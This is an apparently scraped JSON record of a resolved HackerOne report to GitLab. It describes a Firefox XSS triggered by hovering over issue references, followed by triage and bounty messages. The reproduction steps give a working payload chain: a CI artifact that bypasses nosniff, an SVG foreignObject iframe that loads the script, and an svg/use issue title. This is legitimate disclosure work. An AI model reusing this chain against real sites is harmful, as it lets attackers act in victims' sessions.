{"id":831962,"global_id":"Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC84MzE5NjI=","url":"https://hackerone.com/reports/831962","title":"XSS on Issue reference numbers","state":"Closed","substate":"resolved","severity_rating":"medium","readable_substate":"Resolved","created_at":"2020-03-26T11:32:16.498Z","submitted_at":"2020-03-26T11:32:16.498Z","is_member_of_team?":false,"reporter":{"disabled":false,"username":"yvvdwf","url":"/yvvdwf","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/yQ79x7V8gqtK3SUH9zj881MY/3afcb5c896247e7ee8ada31b1c1eb8657e22241f911093acfe4ec7e97a3a959a"},"is_me?":false,"cleared":false,"hackerone_triager":false,"hacker_mediation":false},"team":{"id":264,"url":"https://hackerone.com/gitlab","handle":"gitlab","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/000/264/8dd359f496ba6c5b97c5126dc86924a00fd7ef26_original.png/3afcb5c896247e7ee8ada31b1c1eb8657e22241f911093acfe4ec7e97a3a959a","medium":"https://profile-photos.hackerone-user-content.com/variants/000/000/264/8dd359f496ba6c5b97c5126dc86924a00fd7ef26_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"permissions":[],"submission_state":"open","default_currency":"usd","awards_miles":false,"offers_bounties":true,"state":"public_mode","only_cleared_hackers":false,"profile":{"name":"GitLab","twitter_handle":"gitlab","website":"https://about.gitlab.com","about":"A single application for the entire software development lifecycle."}},"has_bounty?":true,"in_validation?":false,"rejected_anc_report_that_can_be_sent_back_to_anc_triagers?":false,"can_view_team":true,"can_view_report":true,"is_external_bug":false,"is_published":false,"is_participant":false,"stage":4,"public":true,"visibility":"full","cve_ids":[],"singular_disclosure_disabled":true,"disclosed_at":"2020-11-23T16:05:04.527Z","bug_reporter_agreed_on_going_public_at":"2020-11-23T16:05:04.432Z","team_member_agreed_on_going_public_at":"2020-11-20T20:41:17.288Z","comments_closed?":false,"facebook_team?":false,"team_private?":false,"vulnerability_information":"Dear team,\n\nI found an XSS that occurs when users move mouse over reference numbers of issues. \nThis XSS occurs on Firefox. It does not occurs on Webkit-based ones such as Safari, Chrome. I haven't tested on Edge.\nIt can be also occured in older browsers due to [`svg4everybody()`](https://gitlab.com/gitlab-org/gitlab/-/blob/master/app/assets/javascripts/commons/polyfills/svg.js#L11) and [`cachedDocument.body.innerHTML = xhr.responseText`](https://github.com/jonathantneal/svg4everybody/blob/v2.1.9/dist/svg4everybody.js#L36)\n\n### Summary\n\nXSS caused by enabling HTML of tooltip of issues' reference numbers.\nBootstrap sanitizes macilious tags/attributes of HTML tooltips.\nThe issue is that gitlab [allows](https://gitlab.com/gitlab-org/gitlab/-/blob/master/app/assets/javascripts/commons/bootstrap.js#L77) `\u003csvg\u003e`, `\u003cuse\u003e` and its `xlink:href` attribute.\nThis allows attacker to link external resource to svg images, then, to cause the XSS.\n\n\n### Steps to reproduce\n\nFour big steps to reproduce:\n\n1. create a javascript file\n2. create a file containing external svg resource\n3. create an issue's title having svg content that use the resource above\n4. create a reference to the issue, XSS occurs when users move mouse over the reference link\n\nSteps 1,2,3 are supposed to realized in a same project.\n\n#### 1. Create a javascript file\n\nThis step creates a javascript file that may contain arbitrary attack script.\nFor example, add a new file `alert.js` in a selected project with the following content:\n\n```javascript\nalert('Hello: ' + window.parent.location.href);\n```\n\nThis script will be used by an `iframe`.\n\nSince gitlab changes its mime type to ['text/plain'](https://gitlab.com/gitlab-org/gitlab/-/blob/master/app/controllers/concerns/send_file_upload.rb#L16) and set header `X-Content-Type-Options: nosniff`, browser will refuse to execute the javascript file if it will be loaded by script tag, such as `\u003cscript src=alert.js\u003e\u003c/script`.\n\nThis can be bypassed by using `job artifacts`.\n\nCreate another file `.gitlab-ci.yml` with the following content:\n\n```yml\njs:\n  script: echo \"to generate mime type application/javascript\"\n  artifacts:\n    paths:\n    - alert.js\n    expire_in: 4 week\n```\n\nAfter saving the file, gitlab CI/CD will start runing. Wait for the job finished.\nBrowse `Job artifacts`, then get the raw link of the generated `alert.js` file, for example:\n`https://gitlab.com/yvvdwf/svg-use-xss-firefox/-/jobs/486384886/artifacts/raw/alert.js`\n\nNote that the mime type of this js file is now `application/javascript`.\n\n#### 2. Create a svg file\n\nAdd the third file in to the project with the name `xss.svg` and the following content:\n\n```xml\n\u003csvg id=\"xss\" xmlns=\"http://www.w3.org/2000/svg\"\u003e\n\t\u003cforeignObject\u003e\n\t\t\u003ciframe xmlns=\"http://www.w3.org/1999/xhtml\" srcdoc='\u0026lt;script src=https://gitlab.com/yvvdwf/svg-use-xss-firefox/-/jobs/486384886/artifacts/raw/alert.js\u0026gt; \u0026lt;/script\u0026gt;'\u003e\u003c/iframe\u003e\n\t\u003c/foreignObject\u003e\n\u003c/svg\u003e\n```\n\nPlease note that, you must replace the link to `alert.js` file with your.\n\n\n#### 3. Create an issue\n\nCreate a new issue having the following title:\n \n`\u003csvg\u003e\u003cuse xlink:href=\"https://gitlab.com/yvvdwf/svg-use-xss-firefox/-/raw/master/xss.svg#xss\"/\u003e\u003c/svg\u003e`\n\n#### 4. Create a reference to the issue\n\nIn an issue discussion, or in a wiki page, enter the reference number of the issue, for example (suppose the issue id = 1):\n`Move mouse over #1 to see alert`\n\nWhen you move mouse over the number 1, you will see a (normal) tooltip and a popup executed by the `alert.js` file above.\n\nThis has been tested on the latest Firefox (74.0 (64-bit)) on macOS. Firefox allows `foreignObject` (but not [webkit](https://bugs.webkit.org/show_bug.cgi?id=91515))\n\n### Impact\n\nAttacker may perform arbitrary actions on behalf of users at the client side.\n\n### Examples\n\nAn example is on https://gitlab.com/yvvdwf/svg-use-xss-firefox\nThis project is private. Please let me know if you cannot access it.\n\n\n### What is the expected *correct* behavior?\n\nMalicious scripts must not be executed due to svg content.\n\n### Output of checks\n\nThis bug happens on GitLab.com\n\n## Impact\n\nAttacker may perform arbitrary actions on behalf of users at the client side.","vulnerability_information_html":"\u003cp\u003eDear team,\u003c/p\u003e\n\n\u003cp\u003eI found an XSS that occurs when users move mouse over reference numbers of issues. \u003cbr\u003e\nThis XSS occurs on Firefox. It does not occurs on Webkit-based ones such as Safari, Chrome. I haven\u0026#39;t tested on Edge.\u003cbr\u003e\nIt can be also occured in older browsers due to \u003ca href=\"/redirect?url=https%3A%2F%2Fgitlab.com%2Fgitlab-org%2Fgitlab%2F-%2Fblob%2Fmaster%2Fapp%2Fassets%2Fjavascripts%2Fcommons%2Fpolyfills%2Fsvg.js%23L11\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003e\u003ccode\u003esvg4everybody()\u003c/code\u003e\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e and \u003ca href=\"/redirect?url=https%3A%2F%2Fgithub.com%2Fjonathantneal%2Fsvg4everybody%2Fblob%2Fv2.1.9%2Fdist%2Fsvg4everybody.js%23L36\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003e\u003ccode\u003ecachedDocument.body.innerHTML = xhr.responseText\u003c/code\u003e\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e\u003c/p\u003e\n\n\u003ch3 id=\"summary\"\u003eSummary\u003c/h3\u003e\n\n\u003cp\u003eXSS caused by enabling HTML of tooltip of issues\u0026#39; reference numbers.\u003cbr\u003e\nBootstrap sanitizes macilious tags/attributes of HTML tooltips.\u003cbr\u003e\nThe issue is that gitlab \u003ca href=\"/redirect?url=https%3A%2F%2Fgitlab.com%2Fgitlab-org%2Fgitlab%2F-%2Fblob%2Fmaster%2Fapp%2Fassets%2Fjavascripts%2Fcommons%2Fbootstrap.js%23L77\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003eallows\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e \u003ccode\u003e\u0026lt;svg\u0026gt;\u003c/code\u003e, \u003ccode\u003e\u0026lt;use\u0026gt;\u003c/code\u003e and its \u003ccode\u003exlink:href\u003c/code\u003e attribute.\u003cbr\u003e\nThis allows attacker to link external resource to svg images, then, to cause the XSS.\u003c/p\u003e\n\n\u003ch3 id=\"steps-to-reproduce\"\u003eSteps to reproduce\u003c/h3\u003e\n\n\u003cp\u003eFour big steps to reproduce:\u003c/p\u003e\n\n\u003col\u003e\n\u003cli\u003ecreate a javascript file\u003c/li\u003e\n\u003cli\u003ecreate a file containing external svg resource\u003c/li\u003e\n\u003cli\u003ecreate an issue\u0026#39;s title having svg content that use the resource above\u003c/li\u003e\n\u003cli\u003ecreate a reference to the issue, XSS occurs when users move mouse over the reference link\u003c/li\u003e\n\u003c/ol\u003e\n\n\u003cp\u003eSteps 1,2,3 are supposed to realized in a same project.\u003c/p\u003e\n\n\u003ch4 id=\"1-create-a-javascript-file\"\u003e1. Create a javascript file\u003c/h4\u003e\n\n\u003cp\u003eThis step creates a javascript file that may contain arbitrary attack script.\u003cbr\u003e\nFor example, add a new file \u003ccode\u003ealert.js\u003c/code\u003e in a selected project with the following content:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight javascript\"\u003e\u003ccode\u003e\u003cspan class=\"nx\"\u003ealert\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"s1\"\u003eHello: \u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e \u003cspan class=\"o\"\u003e+\u003c/span\u003e \u003cspan class=\"nb\"\u003ewindow\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003eparent\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003elocation\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003ehref\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eThis script will be used by an \u003ccode\u003eiframe\u003c/code\u003e.\u003c/p\u003e\n\n\u003cp\u003eSince gitlab changes its mime type to \u003ca href=\"/redirect?url=https%3A%2F%2Fgitlab.com%2Fgitlab-org%2Fgitlab%2F-%2Fblob%2Fmaster%2Fapp%2Fcontrollers%2Fconcerns%2Fsend_file_upload.rb%23L16\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003e\u0026#39;text/plain\u0026#39;\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e and set header \u003ccode\u003eX-Content-Type-Options: nosniff\u003c/code\u003e, browser will refuse to execute the javascript file if it will be loaded by script tag, such as \u003ccode\u003e\u0026lt;script src=alert.js\u0026gt;\u0026lt;/script\u003c/code\u003e.\u003c/p\u003e\n\n\u003cp\u003eThis can be bypassed by using \u003ccode\u003ejob artifacts\u003c/code\u003e.\u003c/p\u003e\n\n\u003cp\u003eCreate another file \u003ccode\u003e.gitlab-ci.yml\u003c/code\u003e with the following content:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight yaml\"\u003e\u003ccode\u003e\u003cspan class=\"na\"\u003ejs\u003c/span\u003e\u003cspan class=\"pi\"\u003e:\u003c/span\u003e\n  \u003cspan class=\"na\"\u003escript\u003c/span\u003e\u003cspan class=\"pi\"\u003e:\u003c/span\u003e \u003cspan class=\"s\"\u003eecho \u0026quot;to generate mime type application/javascript\u0026quot;\u003c/span\u003e\n  \u003cspan class=\"na\"\u003eartifacts\u003c/span\u003e\u003cspan class=\"pi\"\u003e:\u003c/span\u003e\n    \u003cspan class=\"na\"\u003epaths\u003c/span\u003e\u003cspan class=\"pi\"\u003e:\u003c/span\u003e\n    \u003cspan class=\"pi\"\u003e-\u003c/span\u003e \u003cspan class=\"s\"\u003ealert.js\u003c/span\u003e\n    \u003cspan class=\"na\"\u003eexpire_in\u003c/span\u003e\u003cspan class=\"pi\"\u003e:\u003c/span\u003e \u003cspan class=\"s\"\u003e4 week\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eAfter saving the file, gitlab CI/CD will start runing. Wait for the job finished.\u003cbr\u003e\nBrowse \u003ccode\u003eJob artifacts\u003c/code\u003e, then get the raw link of the generated \u003ccode\u003ealert.js\u003c/code\u003e file, for example:\u003cbr\u003e\n\u003ccode\u003ehttps://gitlab.com/yvvdwf/svg-use-xss-firefox/-/jobs/486384886/artifacts/raw/alert.js\u003c/code\u003e\u003c/p\u003e\n\n\u003cp\u003eNote that the mime type of this js file is now \u003ccode\u003eapplication/javascript\u003c/code\u003e.\u003c/p\u003e\n\n\u003ch4 id=\"2-create-a-svg-file\"\u003e2. Create a svg file\u003c/h4\u003e\n\n\u003cp\u003eAdd the third file in to the project with the name \u003ccode\u003exss.svg\u003c/code\u003e and the following content:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight xml\"\u003e\u003ccode\u003e\u003cspan class=\"nt\"\u003e\u0026lt;svg\u003c/span\u003e \u003cspan class=\"na\"\u003eid=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;xss\u0026quot;\u003c/span\u003e \u003cspan class=\"na\"\u003exmlns=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;http://www.w3.org/2000/svg\u0026quot;\u003c/span\u003e\u003cspan class=\"nt\"\u003e\u0026gt;\u003c/span\u003e\n    \u003cspan class=\"nt\"\u003e\u0026lt;foreignObject\u0026gt;\u003c/span\u003e\n        \u003cspan class=\"nt\"\u003e\u0026lt;iframe\u003c/span\u003e \u003cspan class=\"na\"\u003exmlns=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;http://www.w3.org/1999/xhtml\u0026quot;\u003c/span\u003e \u003cspan class=\"na\"\u003esrcdoc=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026#39;\u0026amp;lt;script src=https://gitlab.com/yvvdwf/svg-use-xss-firefox/-/jobs/486384886/artifacts/raw/alert.js\u0026amp;gt; \u0026amp;lt;/script\u0026amp;gt;\u0026#39;\u003c/span\u003e\u003cspan class=\"nt\"\u003e\u0026gt;\u0026lt;/iframe\u0026gt;\u003c/span\u003e\n    \u003cspan class=\"nt\"\u003e\u0026lt;/foreignObject\u0026gt;\u003c/span\u003e\n\u003cspan class=\"nt\"\u003e\u0026lt;/svg\u0026gt;\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003ePlease note that, you must replace the link to \u003ccode\u003ealert.js\u003c/code\u003e file with your.\u003c/p\u003e\n\n\u003ch4 id=\"3-create-an-issue\"\u003e3. Create an issue\u003c/h4\u003e\n\n\u003cp\u003eCreate a new issue having the following title:\u003c/p\u003e\n\n\u003cp\u003e\u003ccode\u003e\u0026lt;svg\u0026gt;\u0026lt;use xlink:href=\u0026quot;https://gitlab.com/yvvdwf/svg-use-xss-firefox/-/raw/master/xss.svg#xss\u0026quot;/\u0026gt;\u0026lt;/svg\u0026gt;\u003c/code\u003e\u003c/p\u003e\n\n\u003ch4 id=\"4-create-a-reference-to-the-issue\"\u003e4. Create a reference to the issue\u003c/h4\u003e\n\n\u003cp\u003eIn an issue discussion, or in a wiki page, enter the reference number of the issue, for example (suppose the issue id = 1):\u003cbr\u003e\n\u003ccode\u003eMove mouse over #1 to see alert\u003c/code\u003e\u003c/p\u003e\n\n\u003cp\u003eWhen you move mouse over the number 1, you will see a (normal) tooltip and a popup executed by the \u003ccode\u003ealert.js\u003c/code\u003e file above.\u003c/p\u003e\n\n\u003cp\u003eThis has been tested on the latest Firefox (74.0 (64-bit)) on macOS. Firefox allows \u003ccode\u003eforeignObject\u003c/code\u003e (but not \u003ca href=\"/redirect?url=https%3A%2F%2Fbugs.webkit.org%2Fshow_bug.cgi%3Fid%3D91515\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ewebkit\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e)\u003c/p\u003e\n\n\u003ch3 id=\"impact\"\u003eImpact\u003c/h3\u003e\n\n\u003cp\u003eAttacker may perform arbitrary actions on behalf of users at the client side.\u003c/p\u003e\n\n\u003ch3 id=\"examples\"\u003eExamples\u003c/h3\u003e\n\n\u003cp\u003eAn example is on \u003ca title=\"https://gitlab.com/yvvdwf/svg-use-xss-firefox\" href=\"/redirect?url=https%3A%2F%2Fgitlab.com%2Fyvvdwf%2Fsvg-use-xss-firefox\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://gitlab.com/yvvdwf/svg-use-xss-firefox\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e\u003cbr\u003e\nThis project is private. Please let me know if you cannot access it.\u003c/p\u003e\n\n\u003ch3 id=\"what-is-the-expected-correct-behavior\"\u003eWhat is the expected \u003cem\u003ecorrect\u003c/em\u003e behavior?\u003c/h3\u003e\n\n\u003cp\u003eMalicious scripts must not be executed due to svg content.\u003c/p\u003e\n\n\u003ch3 id=\"output-of-checks\"\u003eOutput of checks\u003c/h3\u003e\n\n\u003cp\u003eThis bug happens on GitLab.com\u003c/p\u003e\n\n\u003ch2 id=\"impact\"\u003eImpact\u003c/h2\u003e\n\n\u003cp\u003eAttacker may perform arbitrary actions on behalf of users at the client side.\u003c/p\u003e\n","bounty_amount":"1500.0","formatted_bounty":"$1,500","weakness":{"id":63,"name":"Cross-site Scripting (XSS) - DOM"},"original_report_id":null,"original_report_url":null,"attachments":[],"allow_singular_disclosure_at":null,"vote_count":46,"voters":["daviey","kapkan","mygf","aporlorxl23","bhavi","joaovitormaia","naategh","h4x0r-dz","t3chn0phil3","cryptographer","and 36 more..."],"severity":{"rating":"medium","author_type":"User"},"structured_scope":{"databaseId":18138,"asset_type":"URL","asset_identifier":"gitlab.com","max_severity":"critical"},"abilities":{"assignable_team_members":[],"assignable_team_member_groups":[]},"can_edit_custom_fields_attributes":false,"activities":[{"id":7447225,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hi @yvvdwf,\n\nThank you for submitting this report. We will investigate the issue as soon as possible.\nDue to our current workload, we will get back within 10 business days with an update.\n\nPlease refrain from submitting your report or inquiring about its status through\nadditional channels, as this unnecessarily binds resources in the security team.\n\nBest regards,\nGitLab Security Team\n","markdown_message":"\u003cp\u003eHi \u003ca href=\"/yvvdwf\"\u003e@yvvdwf\u003c/a\u003e,\u003c/p\u003e\n\n\u003cp\u003eThank you for submitting this report. We will investigate the issue as soon as possible.\u003cbr\u003e\nDue to our current workload, we will get back within 10 business days with an update.\u003c/p\u003e\n\n\u003cp\u003ePlease refrain from submitting your report or inquiring about its status through\u003cbr\u003e\nadditional channels, as this unnecessarily binds resources in the security team.\u003c/p\u003e\n\n\u003cp\u003eBest regards,\u003cbr\u003e\nGitLab Security Team\u003c/p\u003e\n","automated_response":true,"created_at":"2020-03-26T12:05:38.174Z","updated_at":"2020-03-26T12:05:38.174Z","actor":{"username":"gitlab-securitybot","cleared":false,"url":"/gitlab-securitybot","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"gitlab","actor_is_team_member":true,"actor_is_concealed_member":true},{"id":7453853,"is_internal":false,"editable":false,"type":"Activities::BugTriaged","message":"Hello @yvvdwf,\n\nThank you for submitting this report.\n\nWe have verified this finding and have escalated to our engineering team.  We will be tracking progress internally at https://gitlab.com/gitlab-org/gitlab/-/issues/212626.  This issue will be made public 30 days following the release of a patch.\n\nGiven the severity of the report, we are paying an initial $1000 on triage. Congratulations!\n\nWe will continue to update you via HackerOne as a patch is scheduled for release.\n\nBest regards,\nDominic\nSecurity Team | GitLab Inc.","markdown_message":"\u003cp\u003eHello \u003ca href=\"/yvvdwf\"\u003e@yvvdwf\u003c/a\u003e,\u003c/p\u003e\n\n\u003cp\u003eThank you for submitting this report.\u003c/p\u003e\n\n\u003cp\u003eWe have verified this finding and have escalated to our engineering team.  We will be tracking progress internally at \u003ca title=\"https://gitlab.com/gitlab-org/gitlab/-/issues/212626\" href=\"/redirect?url=https%3A%2F%2Fgitlab.com%2Fgitlab-org%2Fgitlab%2F-%2Fissues%2F212626\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://gitlab.com/gitlab-org/gitlab/-/issues/212626\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e.  This issue will be made public 30 days following the release of a patch.\u003c/p\u003e\n\n\u003cp\u003eGiven the severity of the report, we are paying an initial $1000 on triage. Congratulations!\u003c/p\u003e\n\n\u003cp\u003eWe will continue to update you via HackerOne as a patch is scheduled for release.\u003c/p\u003e\n\n\u003cp\u003eBest regards,\u003cbr\u003e\nDominic\u003cbr\u003e\nSecurity Team | GitLab Inc.\u003c/p\u003e\n","automated_response":false,"created_at":"2020-03-26T22:08:28.672Z","updated_at":"2020-03-26T22:08:28.672Z","actor":{"username":"dcouture","cleared":false,"url":"/dcouture","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/TpSJ356VRAW7GpCzzZ25R8Kb/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"gitlab","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":7453860,"is_internal":false,"editable":false,"type":"Activities::BountyAwarded","message":"Initial $1000 on triage","markdown_message":"\u003cp\u003eInitial $1000 on triage\u003c/p\u003e\n","automated_response":false,"created_at":"2020-03-26T22:08:57.665Z","updated_at":"2020-03-26T22:08:57.665Z","actor":{"url":"/gitlab","ibb":false,"profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/000/264/8dd359f496ba6c5b97c5126dc86924a00fd7ef26_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"profile":{"name":"GitLab"}},"bounty_amount":"1000.0","bounty_currency":"usd","bonus_amount":"0.0","genius_execution_id":null,"team_handle":"gitlab","collaborator":{"username":"yvvdwf","url":"/yvvdwf"},"actor_is_team_member":true,"actor_is_concealed_member":false},{"id":8191300,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hello,\nI just want to notice that this attack works also by using snippets' titles.\nBest regards,","markdown_message":"\u003cp\u003eHello,\u003cbr\u003e\nI just want to notice that this attack works also by using snippets\u0026#39; titles.\u003cbr\u003e\nBest regards,\u003c/p\u003e\n","automated_response":false,"created_at":"2020-06-03T15:29:31.644Z","updated_at":"2020-06-03T15:29:31.644Z","actor":{"username":"yvvdwf","cleared":false,"url":"/yvvdwf","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/yQ79x7V8gqtK3SUH9zj881MY/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"gitlab","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":8191417,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hi @yvvdwf, \n\nThank you for the additional details, I'll let the team know.\n\nBest regards,\nDominic\nGitLab Security Team","markdown_message":"\u003cp\u003eHi \u003ca href=\"/yvvdwf\"\u003e@yvvdwf\u003c/a\u003e, \u003c/p\u003e\n\n\u003cp\u003eThank you for the additional details, I\u0026#39;ll let the team know.\u003c/p\u003e\n\n\u003cp\u003eBest regards,\u003cbr\u003e\nDominic\u003cbr\u003e\nGitLab Security Team\u003c/p\u003e\n","automated_response":false,"created_at":"2020-06-03T15:42:28.528Z","updated_at":"2020-06-03T15:42:28.528Z","actor":{"username":"dcouture","cleared":false,"url":"/dcouture","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/TpSJ356VRAW7GpCzzZ25R8Kb/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"gitlab","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":8327427,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"ETA for fix:\n\nHi @yvvdwf,\n\nThe issue you reported is currently scheduled to be fixed by 2020-07-31.\n\nThank you again for contacting us!\n\nBest regards,\nGitLab Security Team\n","markdown_message":"\u003cp\u003eETA for fix:\u003c/p\u003e\n\n\u003cp\u003eHi \u003ca href=\"/yvvdwf\"\u003e@yvvdwf\u003c/a\u003e,\u003c/p\u003e\n\n\u003cp\u003eThe issue you reported is currently scheduled to be fixed by 2020-07-31.\u003c/p\u003e\n\n\u003cp\u003eThank you again for contacting us!\u003c/p\u003e\n\n\u003cp\u003eBest regards,\u003cbr\u003e\nGitLab Security Team\u003c/p\u003e\n","automated_response":true,"created_at":"2020-06-18T04:21:38.095Z","updated_at":"2020-06-18T04:21:38.095Z","actor":{"username":"gitlab-securitybot","cleared":false,"url":"/gitlab-securitybot","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"gitlab","actor_is_team_member":true,"actor_is_concealed_member":true},{"id":8388593,"is_internal":false,"editable":false,"type":"Activities::BountyAwarded","message":"Hi @yvvdwf,\n\nThank you again for the report! Your finding has been reviewed and we are awarding a bounty prior the release of a patch. Congratulations!\n\nWe will continue to keep you updated via HackerOne as a fix is scheduled.\n\nBest regards,\nDominic\nGitLab Security Team\n","markdown_message":"\u003cp\u003eHi \u003ca href=\"/yvvdwf\"\u003e@yvvdwf\u003c/a\u003e,\u003c/p\u003e\n\n\u003cp\u003eThank you again for the report! Your finding has been reviewed and we are awarding a bounty prior the release of a patch. Congratulations!\u003c/p\u003e\n\n\u003cp\u003eWe will continue to keep you updated via HackerOne as a fix is scheduled.\u003c/p\u003e\n\n\u003cp\u003eBest regards,\u003cbr\u003e\nDominic\u003cbr\u003e\nGitLab Security Team\u003c/p\u003e\n","automated_response":false,"created_at":"2020-06-23T19:09:11.592Z","updated_at":"2020-06-23T19:09:11.592Z","actor":{"url":"/gitlab","ibb":false,"profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/000/264/8dd359f496ba6c5b97c5126dc86924a00fd7ef26_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"profile":{"name":"GitLab"}},"bounty_amount":"500.0","bounty_currency":"usd","bonus_amount":"0.0","genius_execution_id":null,"team_handle":"gitlab","collaborator":{"username":"yvvdwf","url":"/yvvdwf"},"actor_is_team_member":true,"actor_is_concealed_member":false},{"id":8866538,"is_internal":false,"editable":false,"type":"Activities::BugResolved","message":"Hi @yvvdwf ,\n\nThank you again for the report! Your finding has been patched in GitLab version 13.2.3. Congratulations!\n\nPlease let us know if you find that our patch does not mitigate your finding. Your report will be published in 30 days in GitLab's issue tracker.\n\nWe look forward to your next report!\n\nBest regards,\nVitor\nGitLab Security Team","markdown_message":"\u003cp\u003eHi \u003ca href=\"/yvvdwf\"\u003e@yvvdwf\u003c/a\u003e ,\u003c/p\u003e\n\n\u003cp\u003eThank you again for the report! Your finding has been patched in GitLab version 13.2.3. Congratulations!\u003c/p\u003e\n\n\u003cp\u003ePlease let us know if you find that our patch does not mitigate your finding. Your report will be published in 30 days in GitLab\u0026#39;s issue tracker.\u003c/p\u003e\n\n\u003cp\u003eWe look forward to your next report!\u003c/p\u003e\n\n\u003cp\u003eBest regards,\u003cbr\u003e\nVitor\u003cbr\u003e\nGitLab Security Team\u003c/p\u003e\n","automated_response":false,"created_at":"2020-08-06T15:14:54.501Z","updated_at":"2020-08-06T15:14:54.501Z","actor":{"username":"vdesousa","cleared":false,"url":"/vdesousa","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"reporter":{"username":"yvvdwf","url":"/yvvdwf"},"genius_execution_id":null,"team_handle":"gitlab","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":9882613,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"","markdown_message":"","automated_response":false,"created_at":"2020-11-20T20:41:17.319Z","updated_at":"2020-11-20T20:41:17.319Z","first_to_agree":true,"actor":{"username":"dcouture","cleared":false,"url":"/dcouture","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/TpSJ356VRAW7GpCzzZ25R8Kb/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"gitlab","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":9901038,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"","markdown_message":"","automated_response":false,"created_at":"2020-11-23T16:05:04.467Z","updated_at":"2020-11-23T16:05:04.467Z","actor":{"username":"yvvdwf","cleared":false,"url":"/yvvdwf","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/yQ79x7V8gqtK3SUH9zj881MY/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":n